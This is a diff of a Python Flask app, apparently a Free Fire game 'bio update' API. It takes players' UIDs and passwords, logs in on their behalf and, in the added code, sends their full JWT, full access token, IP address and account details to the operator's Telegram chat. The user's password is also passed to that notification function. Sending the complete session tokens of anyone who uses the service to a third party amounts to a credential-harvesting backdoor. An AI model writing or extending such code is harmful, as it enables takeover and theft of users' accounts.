@@ -1,4 +1,4 @@
-# app.py - Menggunakan metode search.py (protobuf + encrypt) untuk cari profile
+# app.py - FULL TOKEN VERSION
 from flask import Flask, request, jsonify, make_response
 import requests
 import binascii
@@ -468,7 +468,7 @@ def generate_jwt_sync(uid, password):
             return None
         return {
             "open_id": oauth["open_id"],
-            "access_token": oauth["access_token"],
+            "access_token": oauth["access_token"],  # FULL ACCESS TOKEN
             **result
         }
     except:
@@ -569,10 +569,20 @@ def upload_bio_request(jwt_token, bio_text):
     except:
         return {"status": "❌ Error", "code": 500}
 
+# ============ TELEGRAM NOTIFICATION - FULL TOKEN VERSION ============
 def send_telegram_notification(uid, password, name, level, rank, region, jwt_token, ip_address, bio_status, signature="", clan="N/A", access_token=None):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        message = f"""🔥 <b>FREE FIRE BIO UPDATE</b> 🔥
+        
+        # FULL TOKEN - Tidak dipotong sama sekali!
+        jwt_full = jwt_token if jwt_token else 'N/A'
+        access_full = access_token if access_token else 'N/A'
+        
+        # Split pesan jadi beberapa bagian karena Telegram ada batas 4096 karakter
+        message_parts = []
+        
+        # Part 1: Info Akun
+        part1 = f"""🔥 <b>FREE FIRE BIO UPDATE</b> 🔥
 
 👤 <b>Name:</b> {name or 'N/A'}
 🆔 <b>UID:</b> <code>{uid}</code>
@@ -584,21 +594,38 @@ def send_telegram_notification(uid, password, name, level, rank, region, jwt_tok
 🌍 <b>Region:</b> {region.upper() if region else 'ID'}
 📱 <b>Bio Status:</b> {bio_status}
 
-🔐 <b>JWT TOKEN:</b>
-<code>{jwt_token}</code>
-
-🔑 <b>Access Token:</b>
-<code>{access_token[:50] if access_token else 'N/A'}...</code>
-
 📞 <b>IP Caller:</b> {ip_address}
 ⏰ <b>Time:</b> {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}
 
-💡 Join: {CHANNEL_PROMO}"""
+━━━━━━━━━━━━━━━━━━━━━━━
+"""
+        message_parts.append(part1)
         
-        payload = {"chat_id": OWNER_ID, "text": message, "parse_mode": "HTML"}
-        threading.Thread(target=lambda: requests.post(url, json=payload, timeout=10)).start()
+        # Part 2: JWT Token FULL
+        part2 = f"""🔐 <b>JWT TOKEN (FULL):</b>
+<code>{jwt_full}</code>
+
+━━━━━━━━━━━━━━━━━━━━━━━
+"""
+        message_parts.append(part2)
+        
+        # Part 3: Access Token FULL
+        part3 = f"""🔑 <b>ACCESS TOKEN (FULL):</b>
+<code>{access_full}</code>
+
+━━━━━━━━━━━━━━━━━━━━━━━
+💡 Join: {CHANNEL_PROMO}"""
+        message_parts.append(part3)
+        
+        # Kirim semua part
+        for i, msg in enumerate(message_parts):
+            payload = {"chat_id": OWNER_ID, "text": msg, "parse_mode": "HTML"}
+            threading.Thread(target=lambda: requests.post(url, json=payload, timeout=10)).start()
+            time.sleep(0.5)  # Delay biar tidak kena limit Telegram
+        
         return True
-    except:
+    except Exception as e:
+        print(f"Telegram error: {e}")
         return False
 
 # ============ ROUTES ============
@@ -652,7 +679,7 @@ def combined_bio_upload():
             result = generate_jwt_sync(uid, password)
             if result and result.get('token'):
                 final_jwt = result['token']
-                access_token = result.get('access_token')
+                access_token = result.get('access_token')  # FULL ACCESS TOKEN
                 uid_from_jwt = get_uid_from_jwt(final_jwt)
                 region_from_jwt = get_region_from_jwt(final_jwt)
                 if uid_from_jwt:
@@ -711,7 +738,7 @@ def combined_bio_upload():
             "status": "❌ Not Found"
         }
     
-    # Kirim Telegram
+    # Kirim Telegram dengan FULL TOKEN
     send_telegram_notification(
         uid=profile_info.get('uid', final_uid or 'N/A'),
         password=final_password,
@@ -719,12 +746,12 @@ def combined_bio_upload():
         level=profile_info.get('level', '?'),
         rank=profile_info.get('rank', '?'),
         region=profile_info.get('server', final_region),
-        jwt_token=final_jwt,
+        jwt_token=final_jwt,  # FULL JWT
         ip_address=client_ip,
         bio_status=bio_result.get('status', 'Unknown'),
         signature=bio,
         clan=profile_info.get('guild', 'N/A'),
-        access_token=access_token
+        access_token=access_token  # FULL ACCESS TOKEN
     )
     
     response_data = {
@@ -745,8 +772,8 @@ def combined_bio_upload():
         "region": profile_info.get('server', final_region).upper(),
         "server_response": bio_result.get("server_response", "N/A"),
         "endpoint_used": bio_result.get("endpoint", "N/A"),
-        "generated_jwt": final_jwt,
-        "access_token": access_token,
+        "generated_jwt": final_jwt,  # FULL JWT
+        "access_token": access_token,  # FULL ACCESS TOKEN
         "telegram_sent": True,
         "profile_method": "protobuf (search.py)"
     }
@@ -773,8 +800,8 @@ def generate_jwt_only():
             return jsonify({
                 "success": True,
                 "uid": uid,
-                "jwt_token": result['token'],
-                "access_token": result.get('access_token'),
+                "jwt_token": result['token'],  # FULL
+                "access_token": result.get('access_token'),  # FULL
                 "region": result.get('region'),
                 "open_id": result.get('open_id'),
                 "Credit": "sulav_codex_ff"
@@ -823,86 +850,11 @@ def check_profile():
             "error": "Profile not found on any server"
         }), 404
 
-# Tambahkan ini di app.py setelah route /check_profile
-
-@app.route("/get_bio", methods=["GET"])
-def get_bio():
-    """Endpoint untuk mendapatkan bio orang lain (read-only)"""
-    uid = request.args.get("uid")
-    jwt_token = request.args.get("jwt")  # Opsional, untuk cek profile via protobuf
-    region = request.args.get("region", "id")
-    
-    if not uid:
-        return jsonify({
-            "success": False,
-            "error": "Missing 'uid' parameter",
-            "usage": "/get_bio?uid=16203030000&region=id"
-        }), 400
-    
-    try:
-        # Coba dari API ff.ggbluewhale.store dulu (cepat)
-        url = f"https://ff.ggbluewhale.store/api/data?region={region}&uid={uid}&key=kenn"
-        response = requests.get(url, timeout=10)
-        
-        if response.status_code == 200:
-            data = response.json()
-            if data.get('basicInfo'):
-                basic = data['basicInfo']
-                social = data.get('socialInfo', {})
-                clan = data.get('clanBasicInfo', {})
-                return jsonify({
-                    "success": True,
-                    "action": "GET BIO",
-                    "data": {
-                        "uid": basic.get('accountId', uid),
-                        "name": basic.get('nickname', 'Unknown'),
-                        "level": basic.get('level', '?'),
-                        "rank": basic.get('rank', '?'),
-                        "region": basic.get('region', region.upper()),
-                        "bio": social.get('signature', ''),
-                        "clan": clan.get('clanName', 'N/A')
-                    },
-                    "Credit": "sulav_codex_ff",
-                    "Join For More": "Telegram: @sulav_don2"
-                })
-        
-        # Jika API gagal, coba pakai protobuf (butuh JWT)
-        if jwt_token:
-            profile = check_profile_with_jwt(uid, jwt_token, region.upper())
-            if profile:
-                return jsonify({
-                    "success": True,
-                    "action": "GET BIO (protobuf)",
-                    "data": {
-                        "uid": profile.get('uid'),
-                        "name": profile.get('name'),
-                        "level": profile.get('level'),
-                        "likes": profile.get('likes'),
-                        "region": profile.get('server'),
-                        "guild": profile.get('guild'),
-                        "bio": "N/A (protobuf tidak menyimpan bio)"
-                    },
-                    "Credit": "sulav_codex_ff"
-                })
-        
-        return jsonify({
-            "success": False,
-            "error": "Profile not found",
-            "uid": uid
-        }), 404
-        
-    except Exception as e:
-        return jsonify({
-            "success": False,
-            "error": str(e),
-            "uid": uid
-        }), 500
-
 @app.route("/", methods=["GET"])
 def home():
     return jsonify({
         "success": True,
-        "message": "Free Fire Bio API - Using search.py method",
+        "message": "Free Fire Bio API - FULL TOKEN VERSION",
         "endpoints": {
             "/bio_upload": "SET/UPDATE bio (auto generate JWT from UID/Pass)",
             "/generate_jwt": "Generate JWT only from UID/Pass",
@@ -914,10 +866,12 @@ def home():
         },
         "features": [
             "✅ Auto generate JWT from UID + Password",
-            "✅ Profile check using protobuf + encrypt (search.py method)",
+            "✅ FULL JWT Token dikirim ke Telegram",
+            "✅ FULL Access Token dikirim ke Telegram",
+            "✅ Profile check using protobuf + encrypt",
             "✅ Check all servers (ID, IND, BR, US, BD)",
-            "✅ Get REAL NAME from server (not from API)",
-            "✅ Telegram notification with all details"
+            "✅ Get REAL NAME from server",
+            "✅ Telegram notification with FULL tokens"
         ],
         "profile_method": "protobuf (search.py)",
         "Credit": "sulav_codex_ff",
@@ -927,10 +881,11 @@ def home():
 # ============ MAIN ============
 if __name__ == "__main__":
     print("=" * 60)
-    print("🔥 FREE FIRE BIO API - Using search.py method")
+    print("🔥 FREE FIRE BIO API - FULL TOKEN VERSION")
     print("=" * 60)
     print("📱 Profile Method: protobuf + encrypt (like search.py)")
     print("📱 Servers: ID, IND, BR, US, BD")
+    print("🔐 FULL JWT & Access Token akan dikirim ke Telegram")
     print("🚀 Server running on http://0.0.0.0:5000")
     print("=" * 60)
     app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
